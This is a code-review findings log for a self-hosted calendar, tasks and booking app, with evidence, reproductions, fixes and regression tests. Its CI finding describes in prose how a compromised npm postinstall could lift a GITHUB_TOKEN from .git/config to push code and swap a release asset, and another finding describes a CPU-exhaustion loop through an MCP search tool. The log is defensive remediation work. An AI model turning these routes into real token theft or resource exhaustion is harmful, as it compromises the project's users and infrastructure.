`end = start + vDuration.from_ical(ev["duration"])` adds a timedelta to a zone-aware local datetime, which adds to the naive fields and re-derives the offset — the exact wall-clock arithmetic `generate_slots` (line 264-271) and `pad` (line 186-188) both carry comments explaining they must avoid. DURATION-only VEVENTs are ordinary foreign-client output (DAVx5/phone clients — the repo has test_busy_intervals_duration_from_real_ics for precisely that shape, and get_events_in_range was specially fixed to admit them because "the row feeds the booking conflict check"). Across spring-forward the derived end is an hour EARLY, so the tail of a real commitment is advertised and bookable by an anonymous visitor; across fall-back it is an hour LATE, silently withholding an hour of genuine availability.

<details><summary>Evidence</summary>

```
backend/tasksd/scheduling.py:144-145

    elif ev.get("duration"):
        end = start + vDuration.from_ical(ev["duration"])   # wall-clock add

Against the real module, tz = America/Chicago:

    spring-forward, DTSTART 2026-03-08T07:30:00Z (01:30 CST) + DURATION:PT2H
        got  06:30Z? no -> blocked 07:30Z -> 08:30Z
        want                         07:30Z -> 09:30Z
      => the final hour (08:30Z-09:30Z) of a real two-hour commitment is not in the
         busy set; generate_slots offers it and book_slot writes a VEVENT on top of it.

    fall-back,     DTSTART 2026-11-01T06:30:00Z (01:30 CDT) + DURATION:PT30M
        got  blocked 06:30Z -> 08:00Z   (90 minutes)
        want         06:30Z -> 07:00Z   (30 minutes)
      => an hour of free time is withheld from the public page.

test_busy_intervals_duration_fallback and test_busy_intervals_duration_from_real_ics
both use 2026-07-13, so neither transition is exercised on this branch.
```

</details>

**Suggested fix.** Add the duration to the instant and derive the local value back, the way `pad` already does: `end = (_u(start) + vDuration.from_ical(ev["duration"])).astimezone(tz)`. Add the two cases above to the DST battery.

**Pinned by** `test_a_duration_only_event_blocks_its_authored_length_across_a_transition` in `backend/tests/test_backlog_aug19_stage3_ical.py`.

#### [x] The booking ledger row is written after the CalDAV PUT, so a failure in between makes the visitor's own retry a 409 and turns one booking into two

`backend/tasksd/service.py:919` · **medium** · bug · stage 3

The whole replay mechanism keys on the ledger: `store.get_booking_by_event(conn, f"{client_id}@tasksd")` (service.py:864). But the ledger row is inserted at line 919, after `self.create_event(...)` at line 911 has already PUT the VEVENT to Radicale. `create_event` -> `engine.create_event` does the PUT and then a second round trip, `_refresh_from_wire` (engine.py:522-532: `self.dav.get(href)`, extract, upsert in a transaction), any part of which can raise DavError — as can a process restart between the two statements. When that happens the event is on the owner's calendar and the ledger has no row, so the client's retry with the SAME client_id (which BookingPage deliberately keeps stable for the chosen slot) is not recognised as a replay. Once the background sync has pulled the orphaned event into the cache, `_link_busy` sees it, `generate_slots` drops the slot, and `book_slot` raises SlotTaken. This reproduces the exact user-visible failure the earlier lost-response finding was fixed to remove, through a different door: the page says "That time was just taken — please pick another" about the visitor's own booking, they pick a second slot, and the owner ends up with two events for one person — one of which is invisible in Settings -> Bookings and uncounted in `booking_count`.

<details><summary>Evidence</summary>

```
backend/tasksd/service.py:911-926

            event = self.create_event(          # <-- DAV PUT happens here
                link["calendar_href"], f"{link['title']} - {name}",
                dtstart=req.astimezone(timezone.utc), ...)
            booking_id = uuid.uuid4().hex
            store.insert_booking(               # <-- ledger row only here
                self._conn, id=booking_id, link_token=token, ...)

backend/tasksd/sync/engine.py:290-291 (inside create_event, both under book_slot's lock):

            self._put_new(href, uid, raw)             # committed on the server
            self._refresh_from_wire(collection_href, href)   # a SECOND GET; can raise

Failure scenario: visitor confirms 14:00. `_put_new` succeeds — the VEVENT is on the
owner's calendar. Radicale is restarted (radicale.service) or the loopback GET hits the
30 s request timeout, so `_refresh_from_wire` raises DavError; book_slot unwinds before
insert_booking; the route releases the link credit and the DavError handler answers 502
"calendar server unavailable, try again shortly". BookingPage keeps phase='confirm',
the slot and the SAME cid, and shows that message. The visitor waits and presses Confirm
again. By then the sync loop has cached the orphaned event, so:
  get_booking_by_event("<cid>@tasksd") -> None      (no ledger row was ever written)
  generate_slots -> 14:00 is blocked by the visitor's own event
  SlotTaken -> 409 -> "That time was just taken - please pick another."
They book 15:00. Owner: two VEVENTs, one ledger row, one person.
`_put_new`'s own idempotency (same slug -> same href -> 412 -> same UID -> success) is
never reached, because the SlotTaken guard fires first. No test exercises a failure
between the PUT and the ledger insert; test_service_unit.py stubs create_event entirely.
```

</details>

**Suggested fix.** Make the replay hook independent of the ledger. Cheapest: before raising SlotTaken, look up `{client_id}@tasksd` in the link's calendar (store.get_item) and, if the conflicting event is the caller's own, fall through to the create (which `_put_new` already makes idempotent) and insert the missing ledger row. Alternatively write the ledger row before the DAV PUT and reconcile it on failure. Add a test that fails `_refresh_from_wire` once after a successful PUT, then retries with the same client_id and asserts a 201 with one event and one ledger row.

**Pinned by** `test_a_booking_retried_after_a_failed_write_is_not_a_conflict_with_itself` in `backend/tests/test_backlog_aug19_stage3_core.py`.

#### [x] Test gap: no test drives busy_intervals across a DST transition at all, which is why two real slot-math defects survived three sweeps

`backend/tests/test_scheduling.py:77` · **low** · test-gap · `minor` · stage 5

The DST battery covers slot GENERATION thoroughly (four parametrized cases plus three filter cases added by the last sweep), but `busy_intervals` — the function that turns untrusted foreign iCalendar into the conflict set behind the only unauthenticated write path — is only ever tested on 2026-07-13, an ordinary July Monday. Every DST fixture in the file is an `Interval` constructed by hand (`_iv`, `_FIRST_PASS`), so the parse-and-normalize step is bypassed on every DST case, and the one busy fixture on a transition day (test_fall_back_busy_in_one_pass_leaves_the_other_bookable, :313) covers 06:00Z-06:30Z — entirely inside the first pass, never crossing 07:00Z. As a result neither the `end > start` guard (scheduling.py:148) nor the DURATION branch (scheduling.py:145) is exercised on a transition, and both are wrong.

<details><summary>Evidence</summary>

```
tests/test_scheduling.py:77 (the only end/duration parsing tests, all on 2026-07-13):

    def test_busy_intervals_naive_and_aware():
        naive = _ev(start="2026-07-13T10:00:00", end="2026-07-13T11:00:00")
        aware = _ev(start="2026-07-13T15:30:00+00:00", end="2026-07-13T16:30:00+00:00")

tests/test_scheduling.py:313 (the only busy fixture on a DST day, built as an Interval,
not parsed, and confined to one pass):

    busy = [Interval(_FIRST_PASS.astimezone(TZ),
                     (_FIRST_PASS + timedelta(minutes=30)).astimezone(TZ))]

Change nothing in scheduling.py and both defects reproduce while the suite stays green:

    busy_intervals([{start:"2026-11-01T06:30:00+00:00", end:"2026-11-01T07:00:00+00:00"}], TZ)
        -> []            # a real 30-minute event vanishes from the busy set
    busy_intervals([{start:"2026-03-08T07:30:00+00:00", duration:"PT2H"}], TZ)
        -> [07:30Z..08:30Z]   # an hour short of the real commitment
```

</details>

**Suggested fix.** Add busy_intervals cases that go through the real parser on both transition days: (a) an aware DTSTART/DTEND pair spanning 07:00Z on 2026-11-01, asserting one interval of exactly 30 minutes of absolute time; (b) a DURATION-only event spanning each transition, asserting `_u(end) - _u(start)` equals the DURATION; (c) an integration case that books the 01:30 CDT slot and then asserts a second POST for the same instant is refused.

**Pinned by** `test_busy_intervals_hold_their_absolute_length_across_a_dst_change` in `backend/tests/test_backlog_aug19_stage45.py`.

### Sync engine

#### [x] split_event's 412 recovery always fails with a 409 and strands a duplicate recurring series on the server

`backend/tasksd/sync/engine.py:435` · **high** · bug · stage 3

"This and following" writes the tail to a brand-new href FIRST, then truncates the head with If-Match. When the head PUT hits the 412 the docstring calls expected ("a 412 re-derives both from the fresh copy (invariant #5)"), the recovery path re-derives head+tail from the fresh body and overwrites the tail it already wrote: `self.dav.put(tail_href, tail)`. But `ical.split_series` mints a fresh `uuid4().hex@tasksd` UID for the tail on every call (ical/edit.py:1098), so the replacement body carries a DIFFERENT UID than the resource already sitting at `tail_href`. Radicale rejects exactly that with 409 `no-uid-conflict` (radicale/app/put.py:351 `if (item and item.uid != prepared_item.uid ...)`), which is a `Conflict`, not a `PreconditionFailed` — so it escapes the whole handler uncaught. The head is never truncated, the tail is never cleaned up (the only cleanup is inside the inner `except PreconditionFailed`), and `Conflict` has no exception handler in app.py, so it lands on the `DavError` catch-all and the user is told "calendar server unavailable, try again shortly" (502). The same block strands the tail for any other post-tail failure: if the master was deleted concurrently, `fresh = self.dav.get(href)` on line 432 raises NotFound and the tail is likewise left behind. Trigger is the case the repo itself calls normal, not rare — move_event's docstring says "the cache lags Radicale by up to one poll, and it is normal for another CalDAV client to edit an event inside that window". Nothing in the test suite exercises this path (test_api.py:360/390 cover only the uncontended split).

<details><summary>Evidence</summary>

```
engine.py:408-445 (the write order and the two recovery paths):

    head, tail = build(row["raw_ics"])          # built from the STALE cached body
    tail_href = f"{collection_href}{uuid.uuid4().hex}.ics"
    self.dav.put(tail_href, tail, if_none_match="*")   # duplicate series now live
    try:
        write_head(head, row["etag"])                  # 412: someone else edited it
    except PreconditionFailed:
        fresh = self.dav.get(href)                     # NotFound here => tail stranded
        head, tail = build(fresh.data)                 # <- NEW random tail UID
        if tail_href is not None:
            self.dav.put(tail_href, tail)              # <- 409 no-uid-conflict, uncaught

Run against the pinned scratch Radicale (3.7.8), engine + real DavClient:

  series@x = weekly VEVENT, RRULE:FREQ=WEEKLY;COUNT=10, synced (etag E0 cached)
  foreign client adds LOCATION:Room 4 with If-Match E0     -> etag now E1
  eng.split_event(col, "series@x", "2026-01-20T09:00:00+00:00", EventEdit(summary="Renamed"))

  split raised: Conflict 409 PUT .../ae7e257539e44c4cab80cf3e69a8e08d.ics -> 409
  wire after split:
    ae7e2575....ics | UID:b582095e...@tasksd  DTSTART:20260120T090000Z  RRULE:FREQ=WEEKLY;COUNT=8  SUMMARY:Renamed
    series%40x.ics  | UID:series@x            DTSTART:20260106T090000Z  RRULE:FREQ=WEEKLY;COUNT=10 SUMMARY:Standup

So the edit did not happen (original untouched, still 10 occurrences, still "Standup") and an 8-occurrence duplicate series is now permanently in the calendar with no owner: nothing in the app created a cache row for it (no _refresh_from_wire ran), the user sees eight phantom "Renamed" events next to the originals after the next poll, and those phantom events also count as busy time for the public booking page. app.py:852 maps the escaping Conflict to 502 "calendar server unavailable, try again shortly", so the message says transient-server-problem. Retrying within the poll window repeats the whole sequence and strands another tail (the cached etag is still E0).

Second trigger, same block, verified the same way: foreign client deletes the series between our last sync and the write ->
  split raised: NotFound GET .../series%40x.ics -> 404
  wire after split: ['.../45009a4a6bd7430db7e8bcba92da14b4.ics']   # the tail, alone, forever
```

</details>

**Suggested fix.** Make the tail replacement UID-safe and make cleanup unconditional. In the 412 path, delete `tail_href` before re-PUTting the rebuilt tail (or have `split_series` accept the tail UID so the rebuild reuses the first one), and wrap everything from the first `self.dav.put(tail_href, ...)` to the end of the recovery block in a `try/except BaseException` that deletes `tail_href` (best-effort) before re-raising — the inner `except PreconditionFailed` already does exactly this for one of the several failure paths. Also give `Conflict` (CalDAV `no-uid-conflict`) an explicit mapping to `ConflictError`/409 rather than the 502 catch-all. Add two tests against the scratch server: a foreign edit between sync and split (assert no extra resource survives and the caller sees a ConflictError), and a foreign delete of the master (same assertion).

**Pinned by** `test_a_contended_this_and_following_split_leaves_no_duplicate_series` in `backend/tests/test_backlog_aug19_stage3_ical.py`.

#### [x] move_event maps Radicale's 409 no-uid-conflict to "calendar server unavailable" (502) instead of the conflict it already has a message for

`backend/tasksd/sync/engine.py:349` · **low** · bug · `minor` · stage 3

The destination PUT is guarded only against `PreconditionFailed`, which covers the case where the destination *href* is occupied. Radicale also enforces UID uniqueness per collection: creating an item whose UID already exists in that collection under a different filename returns 409 with `C:no-uid-conflict` (radicale/app/put.py:351-356, verified — the same rule rejects a duplicate-UID PUT with 409). That raises `dav.errors.Conflict`, which is a plain `DavError`, so it sails past the `except PreconditionFailed` and past every specific handler in app.py, landing on the `DavError` catch-all at app.py:852 → 502 "calendar server unavailable, try again shortly". The engine already has the correct user-facing message two lines below ("event {uid} already exists in the target calendar"); it just never fires for this spelling of the same condition. The `Conflict` docstring in dav/errors.py ("409 — e.g. MKCALENDAR on an existing path, or a parent that doesn't exist") is what makes the omission look deliberate, and it does not mention the no-uid-conflict case that the write path actually meets. No test covers any move failure path (test_api.py:262 covers only the happy path and an unknown destination id).

<details><summary>Evidence</summary>

```
engine.py:347-351:

    current = self.dav.get(row["href"])
    try:
        self.dav.put(new_href, current.data, if_none_match="*")
    except PreconditionFailed as e:
        raise ConflictError(f"event {uid} already exists in the target calendar") from e

Run against the scratch Radicale: event uid mv@x lives in src as mv%40x.ics; a foreign
client (Thunderbird/DAVx5 copying the event) has already put the same UID into dst under
its own filename copy-of-standup.ics. Then:

    eng.move_event(src.href, dst.href, "mv@x")
    -> RAW Conflict status 409 PUT http://127.0.0.1:5233/testuser/<dst>/mv%40x.ics -> 409
    src still has: ['/testuser/<src>/mv%40x.ics']       # nothing lost, but

the SPA/MCP caller is told the calendar server is unavailable and to try again shortly,
which is wrong on both counts: the server is fine and retrying can never succeed. The
correct answer (409, "event already exists in the target calendar") is the string one
branch away.
```

</details>

**Suggested fix.** Catch `Conflict` alongside `PreconditionFailed` on the destination PUT: `except (PreconditionFailed, Conflict) as e: raise ConflictError(f"event {uid} already exists in the target calendar") from e` (import `Conflict` from `..dav.errors`), and add a test that seeds the destination collection with the same UID under a different href and asserts a 409/ConflictError rather than a 502.

**Pinned by** `test_a_move_into_a_calendar_holding_that_uid_is_a_conflict_not_an_outage` in `backend/tests/test_backlog_aug19_stage3_core.py`.

### CI & deploy

#### [x] desktop-release.yml grants `contents: write` at workflow scope, so `npm ci` and NuGet restore in the build jobs run with the release-publishing token on disk

`.github/workflows/desktop-release.yml:22` · **medium** · security · `minor` · stage 5

`permissions: contents: write` is declared at the top level of the workflow (lines 22-23), which applies it to every job, not just `release`. The `web` and `client` jobs need nothing but read. Both start with `actions/checkout@v4`, whose `persist-credentials` input defaults to `true` (verified against actions/checkout v4 action.yml:52-54), so checkout writes `http.extraheader = AUTHORIZATION: basic <base64 of x-access-token:$GITHUB_TOKEN>` into `$GITHUB_WORKSPACE/.git/config`. The very next thing the `web` job does is `npm ci` (line 38), which executes install lifecycle scripts for the whole dependency tree — 216 entries in frontend/package-lock.json, and there is no `.npmrc` setting `ignore-scripts`. The `client` job's `dotnet publish` (line 69) likewise runs NuGet restore plus any MSBuild tasks the restored packages carry, and `Microsoft.Web.WebView2` is referenced with a floating `Version="1.0.*"` so the restored code can change without a commit. The scope granted here is exactly the scope needed to rewrite the artifact this workflow ships.

<details><summary>Evidence</summary>

```
desktop-release.yml:22-24

    permissions:
      contents: write

    jobs:
      web:
        runs-on: ubuntu-latest
        ...
        - uses: actions/checkout@v4          # persist-credentials defaults to true
        ...
        - run: npm ci                        # runs postinstall for 216 packages

Failure scenario: a transitive dev-dependency of the Vite/vitest tree publishes a compromised patch release (the standard npm supply-chain event). `npm ci` in the `web` job runs its `postinstall`, which reads `$GITHUB_WORKSPACE/.git/config`, base64-decodes the `http.extraheader` value, and now holds a GITHUB_TOKEN with `contents: write` for nicholaskmitchell/smylte. With it, it can (a) push to `main`, which README.md:210 says the Pi autopulls via `~/tasks-autopull.sh` on a one-minute cron, and (b) replace the `smylte-web.zip` asset on `desktop-latest`, which every installed desktop client downloads and executes on next launch (Updater.cs:229-279 does no signature or digest check on that zip). ci.yml's separate `permissions` gap means the same npm postinstall reaches a token on every PR run too.
```

</details>

**Suggested fix.** Set `permissions: contents: read` at the top of the workflow and move `permissions: contents: write` onto the `release` job only (it is the sole job that calls `gh release`). Additionally pass `persist-credentials: false` to the `actions/checkout@v4` steps in `web` and `client` — neither uses git after checkout. Separately, all six action uses in this repo are pinned by mutable tag (`actions/checkout@v4`, `setup-node@v4`, `setup-python@v5`, `setup-dotnet@v4`, `upload-artifact@v4`, `download-artifact@v4`); pin them to commit SHAs so a retagged action cannot silently change what the release job runs.

**Pinned by** `test_the_build_jobs_hold_no_write_token` in `backend/tests/test_backlog_aug19_stage45.py`.

**Fixed** as suggested: `contents: read` at workflow scope, `contents: write`
moved onto `release` — the only job that publishes and the only one that runs no
dependency code — and `persist-credentials: false` on every checkout, since no
job here uses git after it.

**`ci.yml` got the same treatment, and it needed more of it.** It declared no
`permissions:` at all, at either scope, so its effective grant was the
*repository* default — a setting no reviewer of the file can see and an admin can
widen without a commit. That is also why the pin was widened to fail on an
undeclared permission rather than pass: `None != "write"` is true, so the whole
`ci.yml` half would otherwise have been vacuous. Half-fix checked — repairing
`desktop-release.yml` alone leaves the pin failing.

The control is the half that earned its keep: `contents: read` at workflow scope
with nothing moved onto `release` satisfies the pin completely and silently stops
every desktop release from shipping. It is asserted through the same
effective-permission rule, plus a check that `release` has not itself become a
job that installs dependencies — which would be the finding moved rather than
fixed.

**Widened again after a wrong-fix review.** Four shapes were accepted by the
version above: `permissions:` moved off workflow scope onto two of ci.yml's five
jobs (the other three run `pip install`, which `_INSTALLS` did not match);
deleting every `persist-credentials: false`, which was asserted nowhere though it
is half this entry's own suggested fix; adding an installer to the one job
holding `contents: write`, which the control's denylist could not see; and
keeping write at workflow scope with the build jobs narrowed, which is
functionally equivalent today but inverts least privilege for any job added
later. All four now fail.

**Not done, and deliberately not done quietly:** this entry closes by asking that
the six action uses be pinned to commit SHAs. Resolving `@v4` to a SHA means
reading the `actions/*` repositories, which are outside the GitHub scope granted
to the session that did this work. The permissions change is what the pin
asserts and what closes the finding; the SHA pinning is left open here as a
follow-up rather than reached for out of scope.

#### [x] setup.sh writes the typed Radicale password into a systemd EnvironmentFile without escaping, and systemd's parser eats backslashes and treats a leading quote as an unterminated string that swallows every remaining secret

`deploy/setup.sh:44` · **medium** · bug · `minor` · stage 5

The heredoc at lines 41-56 interpolates values read from an interactive prompt (`RADPW` from `read -rsp`, `AUSER` from `read -rp`) straight into `KEY=value` lines. The bash side is fine — a parameter expansion result is not rescanned, so `$` and backticks in the password are safe. systemd's side is not. `EnvironmentFile=` is parsed by `load_env_file` -> `parse_env_file_internal` (systemd src/basic/env-file.c), whose state machine gives three characters special meaning that setup.sh never accounts for, and it does so silently. The script already carries an explicit comment (lines 28-30) reasoning about "a mismatched/aborted prompt" corrupting this file and guards the HASH for exactly that reason; the same file's other two interpolated values get no such care, and the failure is quieter than the one that was guarded.

<details><summary>Evidence</summary>

```
deploy/setup.sh:41-56

    umask 077
    cat > "$ENVFILE" <<EOF
    RADICALE_URL=http://127.0.0.1:5232
    RADICALE_USER=$USER_NAME
    RADICALE_PASSWORD=$RADPW
    TASKS_DB=$BACKEND/tasks.db
    ...
    TASKS_AUTH_PASSWORD_HASH=$HASH
    TASKS_SESSION_SECRET=$SESSION
    TASKS_HOOK_SECRET=$HOOK
    EOF

systemd src/basic/env-file.c, parse_env_file_internal:
  - PRE_VALUE (the char right after `=`): `'` -> SINGLE_QUOTE_VALUE, `"` -> DOUBLE_QUOTE_VALUE, `\` -> VALUE_ESCAPE.
  - VALUE: `\` -> VALUE_ESCAPE, which appends the NEXT char and drops the backslash.
  - At EOF the tail block pushes whatever accumulated for SINGLE_QUOTE_VALUE / DOUBLE_QUOTE_VALUE with NO error and NO warning — an unterminated quote is not a parse failure.

Failure scenario 1 (silent corruption): the Radicale password is `pi\home2024`. systemd stores `pihome2024`. The service starts normally, the app logs in fine, and every single CalDAV call to Radicale 401s. The UI shows an empty account and "calendar server unavailable"; re-running setup.sh changes nothing because line 20 sees the env file and leaves it untouched.

Failure scenario 2 (whole file eaten): the password begins with a quote, e.g. `"tunnel-otter-9`. systemd enters DOUBLE_QUOTE_VALUE at the character after `RADICALE_PASSWORD=` and consumes the remaining 12 lines of the file into that one value. TASKS_AUTH_PASSWORD_HASH, TASKS_SESSION_SECRET and TASKS_HOOK_SECRET are never set. app.py:695-700 then raises RuntimeError("auth enabled but no password set") on every start — see the separate tasks.service finding for why that becomes a permanent restart loop rather than a failed unit.

Failure scenario 3 (unvalidated empty): pressing Enter at the `Radicale password for ...` prompt writes `RADICALE_PASSWORD=` with no guard, giving the same permanently-401 state as scenario 1. The neighbouring `HASH` is checked for emptiness at lines 35-39; RADPW is not.
```

</details>

**Suggested fix.** Emit the two interpolated values in systemd's double-quoted form with the escapes its DOUBLE_QUOTE_VALUE_ESCAPE state understands — backslash and double-quote each prefixed with a backslash — e.g. `q() { printf '"%s"' "$(printf '%s' "$1" | sed 's/[\\"]/\\&/g')"; }` and then `RADICALE_PASSWORD=$(q "$RADPW")` / `TASKS_AUTH_USER=$(q "$AUSER")`. Add a `[ -n "$RADPW" ] || { echo "empty Radicale password" >&2; exit 1; }` next to the existing HASH guard, since re-running the script will not repair a bad file.

**Pinned by** `test_setup_sh_writes_a_password_systemd_reads_back_unchanged` in `backend/tests/test_backlog_aug19_stage45.py`.

**Fixed** as suggested — a `q()` helper emitting systemd's double-quoted form
with backslash and double-quote escaped, applied to both prompt-read values, and
the empty-password guard `$HASH` already had.

Widened twice before the fix. `TASKS_AUTH_USER` is the second value the heredoc
interpolates from a prompt and carries the identical defect; the pin drove only
the password, so escaping one and not the other passed. And the third failure
scenario — Enter at the prompt — is not a quoting bug at all and no amount of
escaping addresses it, so it has its own test, which additionally asserts that
refusing writes NO file: the check at the top of the script short-circuits on an
existing env file, so a refusal that still wrote something would make re-running
the script a no-op, which is the trap the finding is about.

The control asserts an ordinary install round-trips byte-for-byte. Its first
docstring claimed it guarded against "forgetting the quotes are not part of the
value"; that is not a reachable over-correction — systemd strips them by design,
and `'hunter2'` and `"hunter2"` both read back as `hunter2`. Corrected to name
what it actually catches: an inverted `[ -n ]`/`[ -z ]` guard, which refuses
every valid password while accepting the empty one, and which fails this control
and the empty-password test together.

### CSP & static serving

#### [x] `/book/<token>/` (trailing slash) 404s — the SPA mount swallows it before redirect_slashes can act, though main.tsx explicitly accepts the slash

`backend/tasksd/app.py:1489` · **medium** · bug · `minor` · stage 4

`@app.get("/book/{token}")` is registered with only the bare spelling. `StaticFiles` is then mounted at `/` (app.py:1533) and returns `Match.FULL` for *every* path, so Starlette's router hands `/book/<token>/` to the mount inside its route loop and returns — FastAPI's `redirect_slashes` fallback (which only runs after the loop finds no full match) never executes. StaticFiles resolves `book/<token>` , finds no such file or directory, and raises 404.

This is the exact hazard app.py already documents 25 lines earlier for the RFC 6764 routes: "`redirect_slashes` can't help here because the SPA mount at \"/\" swallows unmatched paths, so the trailing-slash spellings are registered too" (app.py:1470-1472, which registers `/.well-known/caldav/` and `/.well-known/carddav/` explicitly). The booking route did not get the same treatment.

The cross-layer mismatch is that the *client* router deliberately supports the trailing slash — `frontend/src/main.tsx:12` matches `/^\/book\/([A-Za-z0-9_-]+)\/?$/` — so that `\/?` branch is unreachable dead code today, and the anonymous visitor gets a bare JSON 404 instead of the booking page. No test covers the trailing-slash spelling; test_csp.py only requests `/book/anything`.

<details><summary>Evidence</summary>

```
backend/tasksd/app.py:1489-1494
    @app.get("/book/{token}")
    async def booking_spa(token: str):
        index = os.path.join(settings.static_dir, "index.html")
        if not os.path.isfile(index):
            raise HTTPException(status.HTTP_404_NOT_FOUND, "frontend not built")
        return FileResponse(index)

backend/tasksd/app.py:1533
        app.mount("/", StaticFiles(directory=settings.static_dir, html=True), name="spa")

frontend/src/main.tsx:12
const booking = location.pathname.match(/^\/book\/([A-Za-z0-9_-]+)\/?$/)

Reproduced with the same route order (FastAPI 0.x / Starlette 1.6, a real static dir containing index.html):
  GET /book/abc   -> 200 text/html   (SPA served)
  GET /book/abc/  -> 404 application/json  {"detail":"Not Found"}
  GET /book/abc/x -> 404 application/json

Failure scenario: the owner publishes their booking link and, as people routinely do with a path that looks like a folder, a recipient (or a link-rewriting mail client, or the owner typing it) requests `https://tasks.example.com/book/Ab3-_x9Q/`. Instead of the booking page they get a raw `{"detail":"Not Found"}`, which reads exactly like the "this link is no longer available" case the app took pains to distinguish elsewhere. The visitor concludes the link is dead and does not book; the owner sees nothing.
```

</details>

**Suggested fix.** Register the trailing-slash spelling the same way the well-known routes do, e.g. add `@app.get("/book/{token}/")` bound to the same handler (or `app.add_api_route("/book/{token}/", booking_spa, methods=["GET"], include_in_schema=False)`), and add a test asserting both spellings return the SPA index with the CSP header.

**Fixed** by registering the trailing-slash spelling with `add_api_route`, the
way the RFC 6764 discovery routes twenty lines earlier already do for the
identical reason. Not a 308: the mount swallows the path before
`redirect_slashes` runs, so a redirect would have to be hand-written for no gain.

The widened pin adds two controls that bound the repair: `/book/<token>/extra`
must still 404 (so the fix is a second spelling, not a catch-all that would serve
a blank shell for a path the SPA's own matcher refuses), and an unrelated missing
path must still 404. Run against a half-fix that registers the slash spelling
*after* the static mount, the pin still fails.

Not fixed, and filed separately below: `HEAD /book/<token>` 404s on both
spellings, because FastAPI's `APIRoute` — unlike Starlette's `Route` — does not
derive HEAD from GET. The pin says so explicitly rather than quietly asserting
it, which would have driven a fix wider than this finding.

**Pinned by** `test_a_booking_link_serves_the_spa_with_or_without_a_trailing_slash` in `backend/tests/test_backlog_aug19_stage45.py`.

### SQLite cache & store

#### [x] service.search rebuilds the whole collection's children map once per result row, so one uncapped FTS query burns seconds of CPU

`backend/tasksd/service.py:331` · **medium** · bug · `minor` · stage 2

`store.search` has no LIMIT — it returns every item whose summary/description/categories contains a word with the queried prefix. `TaskService.search` then loops over those rows and calls `self._children_map(items)` inside the loop, where `items` is every VTODO in that row's collection. `_children_map` is a pure O(len(items)) rebuild with no memoisation, so the total cost is (matching rows) × (items in the collection) — quadratic in the size of the user's largest list, for a result the caller then paginates away. The per-collection tuple `by_col` was clearly built to hoist exactly this kind of work out of the loop (categories, sidecar and items are all fetched once per collection); the children map is the one piece left inside it. `/api/search` is reachable from `smylte_search_tasks`, which a read-only MCP grant may call — a single-character query matches most of a list, so a scoped connector can make the server spend seconds of CPU per call with no attacker-side cost. The same query pattern is what the already-closed frontend finding "The merged all-lists pane does an O(n²) scan per render (childrenOf)" fixed on the client.

<details><summary>Evidence</summary>

```
service.py:317-332:
    with self._lock:
        rows = [r for r in store.search(self._conn, query) if r["component"] == "VTODO"]
        by_col: dict[str, tuple] = {}
        for r in rows:
            col = r["collection_href"]
            if col not in by_col:
                by_col[col] = (get_all_categories(...), get_all_sidecar(...), [items...])
    out = []
    for r in rows:
        cats, side, items = by_col[r["collection_href"]]
        out.append(self._task_dto(r, cats, side, self._children_map(items)))   # <- per ROW

Measured against the real schema, one list of 3 000 VTODOs ("alpha task N"), query "alpha":
    store.search              -> 3000 rows in 0.024 s
    per-row _children_map     -> 2.98 s
Cost is (rows x items): at 10 000 tasks the same call is ~33 s. mcp/tools.py:260 paginates *after* api.search() has already built every DTO, so `limit` does not bound any of it.

Failure scenario: a read-only MCP connector calls smylte_search_tasks{query:"a", limit:5} in a loop. Each call pegs a threadpool worker for ~3 s on a 3 000-task account and returns five rows.
```

</details>

**Suggested fix.** Compute the children map once per collection, alongside the other three per-collection values: put it in the `by_col` tuple (`by_col[col] = (cats, side, items, self._children_map(items))`) and read it in the output loop. Optionally cap `store.search` with a LIMIT and push the MCP `limit`/`offset` into the query so the DTO build is bounded too.

**Pinned by** `test_searching_a_large_list_is_not_quadratic_in_the_lists_size` in `backend/tests/test_backlog_aug19_stage2.py`.

#### [x] get_events_in_range gates on the master's DTSTART, so a RECURRENCE-ID override moved earlier than the series start is invisible to the calendar grid AND to the booking conflict check

`backend/tasksd/db/store.py:661` · **medium** · bug · stage 3

The candidate query admits recurring rows on the upper bound alone (`dtstart <= end_iso`), and the docstring justifies that by saying a recurring master "projects occurrences *forward* past its own DTEND". That is only half true: `has_rrule` is also set for RDATE, and `recurring_ical_events` applies RECURRENCE-ID overrides, so a resource's recurrence set can contain instants *before* the cached master DTSTART. `items.dtstart` is the master's DTSTART (read.extract caches the master row), so any window that ends before it drops the whole resource — including the occurrence that actually falls inside the window. `service.events_in_range` never sees the row, so `recur.expand_occurrences` is never given the chance to place it. Smylte itself creates this shape: `ical.edit.apply_occurrence_override` (edit.py:628) writes an override with a new DTSTART and explicitly leaves the master rule untouched, so dragging the FIRST occurrence of a series to an earlier date is enough. Foreign clients (Thunderbird/Apple "move this occurrence") produce it too. Consequences, in order of seriousness: (a) `_link_busy` (service.py:753) queries only ±1 day around the requested day, so the moved meeting contributes no busy interval and an anonymous POST /api/public/booking/{token}/book books straight over it; (b) `smylte_find_free_time` (mcp/api.py:521 → list_events → events_in_range) reports the occupied hour as free; (c) the six-week calendar grid asks for [days[0], days[41]+1) (CalendarView.tsx:214-217), so the moved occurrence silently disappears from the month the user just dragged it into. This is the same defect class as the already-closed "DURATION-only events invisible to the booking conflict check" finding, on the other bound.

<details><summary>Evidence</summary>

```
store.py:658-664:
    "SELECT * FROM items WHERE collection_href=? AND component='VEVENT' "
    "AND dtstart <= ? AND (has_rrule=1 OR duration IS NOT NULL "
    "OR COALESCE(dtend, dtstart) >= ?) "
    "ORDER BY dtstart",
    (collection_href, end_iso, start_iso),

Reproduced against the real schema + real extract/expand. Weekly series UID series-1, master DTSTART:20260907T090000Z, RRULE:FREQ=WEEKLY;COUNT=5, plus one override component RECURRENCE-ID:20260907T090000Z with DTSTART:20260824T090000Z (exactly what apply_occurrence_override writes when the first occurrence is dragged to 24 Aug):

  cached items.dtstart      -> 2026-09-07T09:00:00+00:00   has_rrule=1
  recur.expand_occurrences(raw, 2026-08-23, 2026-08-26)
                            -> [('2026-08-24T09:00:00+00:00', 'Standup (moved)', is_override=True)]
  store.get_events_in_range(conn, COL, '2026-08-23T00:00:00', '2026-08-26T00:00:00') -> []
  store.get_events_in_range(conn, COL, '2026-08-24T00:00:00', '2026-08-31T00:00:00') -> []
  store.get_events_in_range(conn, COL, '2026-08-24T00:00:00', '2026-09-10T00:00:00') -> ['series-1']

The first window is exactly what book_slot produces for a 24-Aug booking (`day0 = 2026-08-24`, widened ±1 day by _link_busy), so the 09:00–10:00 slot is offered and accepted. The second is the August 2026 grid window (Jul 26 … Sep 5, `to`=Sep 6), so the event the user just moved is gone from the month on the next reload. No test in test_store_unit.py or test_scheduling.py exercises a recurring resource whose occurrence precedes its master DTSTART.
```

</details>

